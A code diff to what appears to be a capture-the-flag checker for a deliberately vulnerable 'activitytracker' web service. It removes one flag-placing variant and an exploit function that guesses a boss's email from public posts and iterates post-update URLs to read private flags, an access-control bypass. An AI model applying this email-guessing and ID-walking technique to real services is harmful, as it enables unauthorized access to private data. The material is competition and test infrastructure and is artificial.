@@ -33,10 +33,10 @@ class ActivitytrackerChecker(BaseChecker):
     """
 
     # EDIT YOUR CHECKER PARAMETERS
-    flag_variants = 3
+    flag_variants = 2
     noise_variants = 2
     havoc_variants = 3
-    exploit_variants = 3
+    exploit_variants = 2
     service_name = "activitytracker"
     port = 4242  # The port will automatically be picked up as default by self.connect and self.http.
 
@@ -155,51 +155,8 @@ class ActivitytrackerChecker(BaseChecker):
                 if nothing is returned, the service status is considered okay.
                 the preferred way to report errors in the service is by raising an appropriate enoexception
         """
+
         if self.variant_id == 0:
-            # First we need to register a user
-            firstname, lastname = barnum.create_name()
-            company = barnum.create_company_name()
-            jobtitle = barnum.create_job_title()
-            password = barnum.create_pw(length=10)
-
-            boss_firstname, boss_lastname = barnum.create_name()
-            boss_password = barnum.create_pw(length=10)
-
-            email, boss_email = self.generate_matching_emails((firstname.lower(), lastname.lower()),
-                                                              (boss_firstname.lower(), boss_lastname.lower()),
-                                                              company)
-
-            self.register_user(email, password)
-
-
-            # self.generate_random_posts(random.randint(0, 3),
-            #                            data={"firstname": firstname, "lastname": lastname, "company": company,
-            #                                  "jobtitle": jobtitle, "password": password,
-            #                                  "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})
-
-            self.create_post(f"I love working here at {company} as a {jobtitle}. We even have our own gym! My boss {boss_firstname} {boss_lastname} is great, and I'll get a promotion soon! Come work here as well! Cheers, {firstname} {lastname}",
-                             "public",
-                             True)
-
-            # self.generate_random_posts(random.randint(0, 3),
-            #                            data={"firstname": firstname, "lastname": lastname, "company": company,
-            #                                  "jobtitle": jobtitle, "password": password,
-            #                                  "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})
-
-            # self.http_get('/auth/logout')
-            self.register_user(boss_email, boss_password)
-            self.create_post(self.flag,
-                             "private",
-                             True)
-            # self.http_get('/auth/logout')
-
-            # Save the generated values for the associated getflag() call.
-            self.chain_db = {
-                "username": boss_email,
-                "password": boss_password,
-            }
-
-        elif self.variant_id == 1:
             # First we need to register a user
             firstname, lastname = barnum.create_name()
             company = barnum.create_company_name()
@@ -253,7 +210,7 @@ class ActivitytrackerChecker(BaseChecker):
                 "username": checker_email,
                 "password": checker_password,
             }
-        elif self.variant_id == 2:
+        elif self.variant_id == 1:
             # First we need to register a user
             firstname, lastname = barnum.create_name()
             company = barnum.create_company_name()
@@ -333,7 +290,7 @@ class ActivitytrackerChecker(BaseChecker):
                 if nothing is returned, the service status is considered okay.
                 the preferred way to report errors in the service is by raising an appropriate enoexception
         """
-        if self.variant_id == 0 or self.variant_id == 1 or self.variant_id == 2:
+        if self.variant_id == 0 or self.variant_id == 1:
             # First we check if the previous putflag succeeded!
             try:
                 username: str = self.chain_db["username"]
@@ -345,7 +302,7 @@ class ActivitytrackerChecker(BaseChecker):
             self.login_user(username, password)
 
             # Let´s obtain our note.
-            if self.variant_id == 1:
+            if self.variant_id == 0:
                 resp = self.check_friends()
             else:
                 resp = self.check_mine()
@@ -586,16 +543,11 @@ class ActivitytrackerChecker(BaseChecker):
                 The preferred way to report Errors in the service is by raising an appropriate EnoException
         """
         if self.variant_id == 0:
-            flag = self.exploit1()
-            if flag:
-                return flag
-            raise BrokenServiceException("Exploit does not work")
-        elif self.variant_id == 1:
             flag = self.exploit2()
             if flag:
                 return flag
             raise BrokenServiceException("Exploit does not work")
-        elif self.variant_id == 2:
+        elif self.variant_id == 1:
             flag = self.exploit3()
             if flag:
                 return flag
@@ -603,70 +555,9 @@ class ActivitytrackerChecker(BaseChecker):
         else:
             raise EnoException("Wrong variant_id provided")
 
-    pattern1 = re.compile("My boss (\\w+ \\w+) is great. .* Cheers, (\\w+ \\w+)")
     pattern2 = re.compile("by (.*@.*)")
     pattern3 = re.compile("A friend of mine keeps posting their passwords! LOL!")
     pattern4 = re.compile("Private posts are useful to save passwords")
-
-    @staticmethod
-    def guess_boss_email(email, name1, name2):
-        # Guesses another user's email based on the known user's email pattern (email), the new user's full name (name1), and the known user's full name (name2)
-        email_patterns = [
-            lambda x: f"{x[0][0]}.{x[1]}",
-            lambda x: f"{x[0]}.{x[1]}",
-            lambda x: f"{x[0]}{x[1]}",
-            lambda x: f"{x[0][0]}{x[1]}",
-            lambda x: f"{x[1]}",
-            lambda x: f"{x[0]}",
-            lambda x: f"{x[0]}{x[1][0]}",
-        ]
-        user_name = name2.lower().split(" ")
-        for p in email_patterns:
-            e = p(user_name)
-            e += "@" + email.split("@")[-1]
-            if email == e:
-                return p(name1.lower().split(" ")) + "@" + email.split("@")[-1]
-
-    def exploit1(self):
-        # Create new account
-        email = f"{secrets.token_urlsafe(16)}@gmail.com"
-        password = secrets.token_urlsafe(16)
-        self.register_user(email, password)
-        page = 0
-        while page < 5:
-            resp = self.http_get(f"/posts/view/{page}")
-            t = html.unescape(resp.text)
-            if "Activities by" not in t:
-                break
-            page += 1
-            # Split post list by user
-            user_posts = t.split("Activities")
-            for section in user_posts:
-                # find user's email and all posts matching pattern
-                try:
-                    email = re.search(self.pattern2, section).group(1).strip()
-                    post = re.search(self.pattern1, section).groups()
-                    if not post or not email:
-                        continue
-                    # generate email to attack
-                    email_to_attack = self.guess_boss_email(email, post[0], post[1])
-                    n = 0
-                    self.debug(f"attacking {email_to_attack}")
-                    while True:
-                        n += 1
-                        # get flag by editing post based on known email
-                        resp = self.http_get(f"/posts/update/{email_to_attack}/{n}")
-                        if resp.status_code != 200:
-                            break
-
-                        t = html.unescape(resp.text)
-                        if "form" not in t:
-                            break
-                        f = self.search_flag(t)
-                        if f:
-                            return f
-                except:
-                    pass
 
     def exploit2(self):
         # Create new account
